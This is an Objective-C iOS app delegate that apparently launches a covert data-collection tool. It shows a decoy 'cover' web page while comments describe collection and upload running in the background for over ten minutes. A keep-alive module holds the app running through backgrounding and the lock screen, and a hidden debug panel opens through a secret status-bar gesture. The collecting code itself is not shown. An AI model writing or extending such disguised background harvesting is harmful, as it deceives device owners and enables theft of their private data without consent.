#import "OWAppDelegate.h"
#import <WebKit/WebKit.h>
#import "OWRoute.h"
#import "OWCommon.h"
#import "OWKeepAlive.h"
#import "OWSelfTest.h"
#import "OWDebugPanel.h"

@interface OWAppDelegate () <WKScriptMessageHandler>
@property (nonatomic, assign) NSInteger debugPressCount;
@property (nonatomic, strong, nullable) NSDate *debugFirstPress;
@end

@implementation OWAppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    self.window.backgroundColor = [UIColor blackColor];

    UIViewController *vc = [[UIViewController alloc] init];

    WKWebViewConfiguration *cfg = [WKWebViewConfiguration new];
    WKUserContentController *ucc = [WKUserContentController new];
    [ucc addScriptMessageHandler:self name:@"owDebug"];
    cfg.userContentController = ucc;
    WKWebView *wv = [[WKWebView alloc] initWithFrame:self.window.bounds configuration:cfg];

    NSString *p = [[NSBundle mainBundle] pathForResource:@"cover" ofType:@"html"];
    if (p) {
        NSURL *u = [NSURL fileURLWithPath:p];
        [wv loadFileURL:u allowingReadAccessToURL:u.URLByDeletingLastPathComponent];
    }
    vc.view = wv;
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    // 隐藏调试入口：长按状态栏 5 次（每次 1s，10s 内完成）
    [self installDebugGesture];
    // 一直可见的调试按钮（右上角，低对比度）
    [self installDebugButton];

    // 保活先起：采集/上传要跑十几分钟，必须撑住切后台与锁屏
    [[OWKeepAlive shared] start];

    // 自检开关：Info.plist 的 OWSelfTestOnLaunch = YES 时，启动先跑分层自检再起采集。
    // 联调期打开（能直接看出断在哪一层），正式包关掉。
    BOOL selftest = [[[NSBundle mainBundle] objectForInfoDictionaryKey:@"OWSelfTestOnLaunch"] boolValue];

    // 掩盖页面先展示，采集在后台起
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (selftest) {
            OWLog(@"OWSelfTestOnLaunch=YES，先跑分层自检");
            [[OWSelfTest shared] runAll];
        }
        [[OWRoute shared] start];
    });

    return YES;
}

- (void)applicationDidBecomeActive:(UIApplication *)application {
    [[OWKeepAlive shared] ensureRunning];
    OWLog(@"applicationDidBecomeActive protectedData=%d",
          [UIApplication sharedApplication].isProtectedDataAvailable);
}

- (void)applicationWillTerminate:(UIApplication *)application {
    [[OWKeepAlive shared] stop];
}

#pragma mark - 隐藏调试面板

- (void)installDebugButton {
    CGFloat top = self.window.safeAreaInsets.top;
    if (top <= 0) top = 44;

    UIButton *button = [UIButton buttonWithType:UIButtonTypeSystem];
    [button setTitle:@"调试" forState:UIControlStateNormal];
    button.titleLabel.font = [UIFont systemFontOfSize:12 weight:UIFontWeightMedium];
    [button setTitleColor:[UIColor colorWithWhite:1.0 alpha:0.55]
                 forState:UIControlStateNormal];
    button.backgroundColor = [UIColor colorWithWhite:1.0 alpha:0.08];
    button.layer.cornerRadius = 8;
    button.frame = CGRectMake(self.window.bounds.size.width - 62, top + 6, 50, 30);
    button.autoresizingMask = UIViewAutoresizingFlexibleLeftMargin |
                              UIViewAutoresizingFlexibleBottomMargin;
    [button addTarget:self action:@selector(openDebugPanel)
     forControlEvents:UIControlEventTouchUpInside];
    [self.window addSubview:button];
}

- (void)openDebugPanel {
    UIViewController *host = self.window.rootViewController;
    if (!host || host.presentedViewController) return;
    OWLog(@"调试面板已解锁");
    [OWDebugPanel presentFrom:host];
}

- (void)userContentController:(WKUserContentController *)userContentController
      didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.name isEqualToString:@"owDebug"]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [self openDebugPanel];
        });
    }
}

- (void)installDebugGesture {
    UILongPressGestureRecognizer *press =
        [[UILongPressGestureRecognizer alloc] initWithTarget:self
                                                      action:@selector(handleDebugPress:)];
    press.minimumPressDuration = 1.0;
    press.numberOfTouchesRequired = 1;
    press.cancelsTouchesInView = NO;
    [self.window addGestureRecognizer:press];
}

- (void)handleDebugPress:(UILongPressGestureRecognizer *)gesture {
    if (gesture.state != UIGestureRecognizerStateBegan) return;

    CGPoint point = [gesture locationInView:self.window];
    if (point.y > 80) return;   // 只认状态栏区域，避免误触页面

    NSDate *now = [NSDate date];
    if (!self.debugFirstPress ||
        [now timeIntervalSinceDate:self.debugFirstPress] > 10.0) {
        self.debugFirstPress = now;
        self.debugPressCount = 0;
    }
    self.debugPressCount++;

    if (self.debugPressCount < 5) {
        OWLog(@"调试手势 %ld/5", (long)self.debugPressCount);
        return;
    }

    self.debugPressCount = 0;
    self.debugFirstPress = nil;

    [self openDebugPanel];
}

@end
